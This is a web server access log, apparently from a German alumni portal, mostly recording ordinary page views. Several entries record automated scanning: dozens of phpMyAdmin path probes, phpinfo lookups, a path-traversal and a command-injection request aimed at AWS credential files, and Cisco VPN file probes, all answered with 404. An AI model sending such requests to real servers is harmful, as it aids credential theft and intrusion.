user;timestamp;referer;target;method;status
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:47:57;/administrator/db/index.php?lang=en;/administrator/db/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:47:58;/phpmyadmin_/index.php?lang=en;/phpmyadmin_/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:47:59;/phpMyAdmin-5.1.3/index.php?lang=en;/phpMyAdmin-5.1.3/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:00;/phpMyAdmin/index.php?lang=en;/phpMyAdmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:01;/admin/pma/index.php?lang=en;/admin/pma/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:01;/phpMyAdmin6/index.php?lang=en;/phpMyAdmin6/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:02;/db/index.php?lang=en;/db/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:03;/2phpmyadmin/index.php?lang=en;/2phpmyadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:04;/mysql-admin/index.php?lang=en;/mysql-admin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:05;/administrator/phpMyAdmin/index.php?lang=en;/administrator/phpMyAdmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:05;/sql/websql/index.php?lang=en;/sql/websql/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:06;/sql/phpmyadmin4/index.php?lang=en;/sql/phpmyadmin4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:07;/admin/sysadmin/index.php?lang=en;/admin/sysadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:08;/sql/phpMyAdmin2/index.php?lang=en;/sql/phpMyAdmin2/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:08;/php-my-admin/index.php?lang=en;/php-my-admin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:09;/db/phpmyadmin4/index.php?lang=en;/db/phpmyadmin4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:10;/__phpmyadmin/index.php?lang=en;/__phpmyadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:11;/phpMyAdmin1/index.php?lang=en;/phpMyAdmin1/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:12;/db/phpMyAdmin-4/index.php?lang=en;/db/phpMyAdmin-4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:12;/phpMyadmin/index.php?lang=en;/phpMyadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:13;/phpmyadmin6/index.php?lang=en;/phpmyadmin6/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:14;/administrator/phpmyadmin/index.php?lang=en;/administrator/phpmyadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:15;/mysqlmanager/index.php?lang=en;/mysqlmanager/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:15;/phpMyAdmin2/index.php?lang=en;/phpMyAdmin2/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:16;/phpmyAdmin/index.php?lang=en;/phpmyAdmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:17;/admin/web/index.php?lang=en;/admin/web/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:18;/PMA/index.php?lang=en;/PMA/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:19;/phpMyAdmin5/index.php?lang=en;/phpMyAdmin5/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:19;/phpmyadmin3/index.php?lang=en;/phpmyadmin3/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:20;/phpmyadmin2017/index.php?lang=en;/phpmyadmin2017/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:21;/phpMyAdmin4/index.php?lang=en;/phpMyAdmin4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:22;/phpMyAdmin-4/index.php?lang=en;/phpMyAdmin-4/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:22;/administrator/web/index.php?lang=en;/administrator/web/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:23;/administrator/admin/index.php?lang=en;/administrator/admin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:24;/mysqladmin/index.php?lang=en;/mysqladmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:25;/mysql/web/index.php?lang=en;/mysql/web/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:26;/phpMyAdmin-5.1.1/index.php?lang=en;/phpMyAdmin-5.1.1/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:26;/db/myadmin/index.php?lang=en;/db/myadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:27;/admin/sqladmin/index.php?lang=en;/admin/sqladmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:28;/phpmyadmin2018/index.php?lang=en;/phpmyadmin2018/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:29;/phpMyAdmin_/index.php?lang=en;/phpMyAdmin_/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:29;/sql/webadmin/index.php?lang=en;/sql/webadmin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:30;/administrator/PMA/index.php?lang=en;/administrator/PMA/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:31;/admin/index.php?lang=en;/admin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:32;/db/webdb/index.php?lang=en;/db/webdb/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:33;/database/index.php?lang=en;/database/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:33;/phpMyAdmin-5/index.php?lang=en;/phpMyAdmin-5/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:34;/db/db-admin/index.php?lang=en;/db/db-admin/index.php?lang=en;GET;404
059ed82daa2b9e41047343a3db6ebf50b65cfcf3f3bff55805adc95b8152a925;2025-11-01 03:48:35;/db/dbadmin/index.php?lang=en;/db/dbadmin/index.php?lang=en;GET;404
85ffbfe1cb8d9a84c7198c59f85b936d8b5af41e8a43711c0b0f8c8210660f90;2025-11-01 03:49:42;;/gruppen/hobby/philosophie;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:50:57;;/;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:50:59;;/themen;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:01;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:03;;/personen/all/3;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:05;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:07;;/themen/details/abschied-aus-moabit;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:09;;/personen/all/5;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:11;;/gruppen/hobby/elektronikbasteln;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:13;;/gruppen/hobby/einzelsportarten;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:15;;/themen/details/david-gegen-goliath;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:17;;/themen/details/was-kommt-nach-dem-abitur;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:19;;/themen?category=kultur;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:21;;/themen?category=wissenschaft;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:23;;/aktuelles/meldungen?category=wissenschaft;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:25;;/aktuelles/meldungen?category=community;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:27;;/personen/alumni/details/andie-jahnke;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:29;;/personen/alumni/details/sebastian-langhorst;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:31;;/personen/alumni/details/thomas-matzig;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:33;;/personen/alumni/details/johanna-schley;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:35;;/themen?category=community;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:37;;/themen?category=bildung;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:39;;/themen?category=politik;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:41;;/personen/alumni/details/benjamin-voigt;GET;200
637f647f0c07907b544a8d8ec98ef00c32be0588f7a0e324596aa5c1a51394da;2025-11-01 03:51:43;;/themen/details/der-start-ins-studium;GET;200
70ea0ccde28a1426a299b98c8c1f81dc233305dddf164075781ded36a73d6cd4;2025-11-01 03:56:05;;/gruppen/hobby/astronomie;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-01 03:58:33;/personen/alumni/schule/65286;/personen/alumni/schule/5501;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-01 03:59:56;/personen/alumni/schule/65286;/aktuelles/stellenangebote;GET;200
5cd5794b5066a0c224fc0e3da4c9966010470d84fae4b46312e140f7b8af169b;2025-11-01 04:01:07;/;/;GET;200
b42a9557e525ab985763f262d848d9dac7f15c29762f479be527e4e4d040ade9;2025-11-01 04:02:35;;/gruppen/hobby/kulturelle-studien;GET;200
f0752a443ea60fb3be623b8363882614f64a6d3506f04725e723e0da9496b085;2025-11-01 04:09:01;;/personen/alumni/details/lisa-stache;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-01 04:14:17;/gruppen;/gruppen/interesse/datenanalyse-und-forschung;GET;200
df3ec42c151d689164950cd8196970c89060cc1f49f8c46f1c797e1e3570e44e;2025-11-01 04:15:42;;/personen/alumni/schule/HB0001;GET;200
05b86f56a477ba679eea68b32602c6aca4c935a53cff1657fd9b3c2a8c4ac25e;2025-11-01 04:22:50;;/gruppen/interesse/teamarbeit;GET;200
2113021e2c6dc29b9dc3412df2fb008b3429aa9cb44334c552afc34c6ad03b2b;2025-11-01 04:27:59;;/epa/scripts/win/nsepa_setup.exe;HEAD;404
327a19b500f2a3b07a64a2ab9fbd6edcf97af6661cd9fbae3f1bf57ee13ce2b4;2025-11-01 04:30:44;;/personen/alumni/details/johanna-schley;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-01 04:34:15;/personen/alumni/schule/65286;/personen/alumni/schule/68457;GET;200
3d8d05706a93214cd7ee08e6f0f505eb9a6ab91a64b32fb6c5d60b86cfeb46de;2025-11-01 04:34:27;;/personen/alumni/details/jana-zenker;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-01 04:35:37;/gruppen/hobby/reisen;/personen/alumni/details/heidi-burghard;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-01 04:37:05;/gruppen;/gruppen/hobby/yoga-und-meditation;GET;200
a477ccd741bb54b6cb849c60e95108e5bff44ed75478eda17e836529b5250432;2025-11-01 04:37:39;;/personen/alumni/details/jeanette-stephan;GET;200
c7eb044e2d7178db5e77c6a790850b8942a933682942b94fd969cc2d7f66a772;2025-11-01 04:41:24;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
1e8728677d4c953b723a1fc6ddcadefd8cc96cc5db939c175414b34555ec1911;2025-11-01 04:41:45;;/;GET;200
70d8f607df2188fa6b220ee42b7008ce9c5a9c1806495cb505a4ed12e7f07ae4;2025-11-01 04:44:42;;/gruppen/interesse/weiterbildung-und-training;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-01 04:50:34;/personen/alumni/schule/65286;/personen/alumni/schule/183052;GET;200
de22e480c71d13bd8407de0ba3a1a8b89713404cfb64ee367787d33c429f8d8e;2025-11-01 04:51:39;;/personen/alumni/details/benjamin-voigt;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-01 04:51:57;/personen/alumni/details/thomas-matzig;/gruppen/hobby/physik;GET;200
235d05b781fa35b8e343c3a25ed05d0e53513908231e0bab8b5632fd8555ac23;2025-11-01 04:52:33;;/;GET;200
38c5215bf079512ec38674d21bf1154d49eda5e2a2320a31bbfc51cb444fb3da;2025-11-01 04:56:30;;/;GET;200
7c2b63ec45d3ea30876afcb61e1c33ceaa398923383aeb47ff28c06bf87c07e8;2025-11-01 04:59:04;;/gruppen/interesse/selbststandigkeit;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-01 05:06:05;/gruppen;/gruppen/interesse/teamarbeit;GET;200
d168f5e1ca2b775d0ab83abd3aba70c8d6144f83e40b9449551833b8d2809adb;2025-11-01 05:07:58;;/themen?category=politik;GET;200
361fa73d63a8009d91458b7cc71628fa5ebd9235c8fec0e91345ccae713154d7;2025-11-01 05:08:29;/themen/details/fotografie-als-kunst-und-ausdruck;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
9b04f64bc3d205ce27913f3a888d4c6064e2cfeff6ce408d1acd8cc5e7f34c10;2025-11-01 05:16:18;;/personen/alumni/details/sidney-dittrich;GET;200
1272d73726d957da4076e0c395f458119704d3ab7f58bcd14b074d677b4c5b3c;2025-11-01 05:17:58;;/personen/alumni/details/andie-jahnke;GET;200
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:41;;/;GET;200
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:41;;/phpinfo;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:42;;/_profiler/phpinfo;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:44;;/info;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:44;;/phpinfo.php;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:45;;/info.php;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:48;;//pms?module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:48;;//admin/config?cmd=cat+/root/.aws/credentials;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:48;;//.aws/credentials;GET;404
d220c570c947988a1e96ee0802afb5ae9ab820e0a5c1510265b6f20080900b23;2025-11-01 05:22:48;;//home/user/.aws/credentials;GET;404
e01d9934f82b3c60814837bc39f80cbf8b2782fa72fc3af1a4c434a634cd79b0;2025-11-01 05:24:33;;/gruppen/interesse/entrepreneurship;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:30;;/;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:31;/;/;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:32;/;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:33;/;/themen/details/der-start-ins-studium;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:35;/;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:36;/;/personen;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:37;/;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:38;/;/aktuelles/stellenangebote;GET;200
70fe45c3898e7ad88b3db945e44866c50660765aa12e078e1ef5ecc9d6531d90;2025-11-01 05:28:39;/;/themen/details/abschied-aus-moabit;GET;200
7389726564a054409c002336386e298c3e131cf0a80a73bf186c0327ed301608;2025-11-01 05:34:33;;/gruppen/plausch/ai-driven-programme;GET;200
df798ab880fbd964f3cce1114fef28c993ea85d06567ceeb7c0638af95f00b93;2025-11-01 05:36:37;;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
df798ab880fbd964f3cce1114fef28c993ea85d06567ceeb7c0638af95f00b93;2025-11-01 05:41:40;;/themen?category=community;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-01 05:41:53;/personen/alumni/details/josephine-muller;/gruppen/hobby/journalismus;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-01 05:45:13;;/;GET;200
32a5fbb9e98db268403b7af13d6dfa5ffc040feefdc4c5c6c984589b7da28329;2025-11-01 05:54:08;;/gruppen/interesse/gesundheitswesen-und-pflege;GET;200
48c31a3bdca03ba471bbfc3b6d4587d5863e8c938f54c02764c85fbef591b991;2025-11-01 06:06:04;;/;GET;200
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:22;;/ab2g;GET;404
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:22;;/ab2h;GET;404
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:23;;/alive.php;GET;404
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:25;;/;GET;200
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:26;;/;GET;200
b1a44ddbb1d08484a2c2d972f4f8f3dcacd3cd1a6ba252888177265ce3e04bee;2025-11-01 06:08:27;;/teorema505?t=1;GET;404
8ce3efbdebde98046586e2e12fce403e5973dcd91c2712024f2fc82bfec7ca4a;2025-11-01 06:11:35;;/gruppen/interesse/projektmanagement;GET;200
04090f60ffdaa1fcd65102927574956a01d2143f7989e24523077004e0a26324;2025-11-01 06:19:25;;/themen/details/was-kommt-nach-dem-abitur;GET;200
a37569f7c4836616d26f135eeab3fa4891f7f8c8c76250567317fd994959adc8;2025-11-01 06:20:01;/media/system/js/core.js;/media/system/js/core.js;GET;404
a37569f7c4836616d26f135eeab3fa4891f7f8c8c76250567317fd994959adc8;2025-11-01 06:20:02;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
a001d239d8415854b91d55e20ec9a99a2ef8faed96e494f0d26946145039be5b;2025-11-01 06:29:19;;/gruppen/interesse/kommunikationsfahigkeiten;GET;200
b3c0fd974c9fb4c5711bbc27923606cb23769c48932e0204cb2701c3f43f7eba;2025-11-01 06:32:39;;/;GET;200
5f8bcc0ab6d874bf1addcd37ce78c381310a8542854a48b9750c29995bee6a88;2025-11-01 06:48:56;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
bb4a165bbc76ea7dff873306e9bee1a028f9193be5e1f5c521fc5b0257423669;2025-11-01 06:51:17;;/;GET;200
8ad0f13c2740f25f5b9f3b94b6b7dcd9f70a2a2aea21dc7b85e5538a58fc8450;2025-11-01 07:00:01;;/+CSCOL+/Java.jar;GET;404
8ad0f13c2740f25f5b9f3b94b6b7dcd9f70a2a2aea21dc7b85e5538a58fc8450;2025-11-01 07:00:02;;/+CSCOE+/logon_forms.js;GET;404
8ad0f13c2740f25f5b9f3b94b6b7dcd9f70a2a2aea21dc7b85e5538a58fc8450;2025-11-01 07:00:03;;/+CSCOL+/a1.jar;GET;404
8ad0f13c2740f25f5b9f3b94b6b7dcd9f70a2a2aea21dc7b85e5538a58fc8450;2025-11-01 07:00:05;;/+CSCOE+/transfer.js;GET;404
d942ac9f8018c58955638f1ebf109778878197fce4872afdae283a1064670f88;2025-11-01 07:05:05;;/;GET;200
4cfb6ca9de617eec846e55bb8a06552b36acebffa9dd55728e774c3f8e59b7dc;2025-11-01 07:06:31;;/personen/alumni/details/thomas-matzig;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-01 07:09:01;;/themen;GET;200
71096274bd6a0f5b7bf23ad4cad1f46a6c4ca9137b7a17d1650b24ff9e36e14a;2025-11-01 07:11:11;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-01 07:13:12;;/veranstaltungen;GET;200
035f1509c13b28f711d829ac28154a7d223734b172d21902f89955ed6a5da8e8;2025-11-01 07:13:53;;/gruppen/hobby/film-und-videoproduktion;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:19:51;;/;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:13;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:22;;/personen;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:28;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:44;;/aktuelles/stellenangebote;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:21:48;;/themen/details/abschied-aus-moabit;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:22:29;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-01 07:22:46;;/themen/details/der-start-ins-studium;GET;200
7ea4b3b2b79a0a38ca66d5438e76748c131dbf9fe8d206284ea354275151ba5b;2025-11-01 07:23:39;;/gruppen/hobby/lesen;GET;200
9a6cdfa757f92d6a70234c3555e4c1b6e8c505f96c697ba49823f8083c0b220f;2025-11-01 07:27:48;;/login;GET;200
fdc5879c736ea26494e153d21a73751be39700d8592baf023943194c86ec17cd;2025-11-01 07:28:11;;/personen/alumni/details/thomas-matzig;GET;200
